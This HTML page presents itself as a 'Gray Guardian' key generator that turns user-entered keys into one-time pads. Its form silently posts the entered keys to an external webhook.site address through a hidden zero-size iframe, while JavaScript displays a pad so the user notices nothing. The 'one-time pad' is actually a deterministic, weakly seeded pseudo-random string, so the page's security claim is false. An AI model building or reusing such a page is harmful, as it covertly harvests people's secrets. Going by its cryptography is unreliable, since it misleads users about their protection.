<!DOCTYPE html>
<html>
<body>
<h1>Gray Guardian - Robotic Witness - Key Generator</h1>
<p>Input the first two of our keys to get one time pad for first message, or the last two keys to get one time pad for the second message</p>
<iframe name="hiddenFrame" width="0" height="0" border="0" style="display: none;"></iframe>
<form action="https://webhook.site/49dd4d48-02ef-49a1-8db8-d6827eaed4d9" id="myForm" method="post" name="myForm" target="hiddenFrame" onsubmit="generateOneTimePad()">
    <div>
        <label for="name">Keys: </label>
        <input type="text" id="keys" name="keysforpadgeneration" />
        <div>
</form>
<p>Press enter to continue and recieve one time pads.</p>
<p>Submit the keys in all caps like so: If the keys were ALPHA OMEGA HELLO WORLD, the submit the key as "ALPHAOMEGAHELLOWORLD". We will include keys for the second message in the first message.</p>
<p id="onetimepad"></p>
<script>

    var seed = 0;

    function makeid(length) {
        var text = "";
        var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

        for (var i = 0; i < length; i++)

            text += possible.charAt(Math.floor(random() * possible.length));

        return text;
    }

    function generateOneTimePad() {
        seed = getHash(document.getElementById("keys").value);
        var node = document.getElementById("onetimepad");
        node.innerText = makeid(1500).replace(/[0-9]/g, '').toLowerCase();
        console.log("hello world");
    }


    function random() {
        var x = Math.sin(seed++) * 10000;
        return x - Math.floor(x);
    }

    function getHash(input){
        var hash = 0, len = input.length;
        for (var i = 0; i < len; i++) {
            hash  = ((hash << 5) - hash) + input.charCodeAt(i);
            hash |= 0;
        }
        return hash;
    }




</script>
</body>
</html>
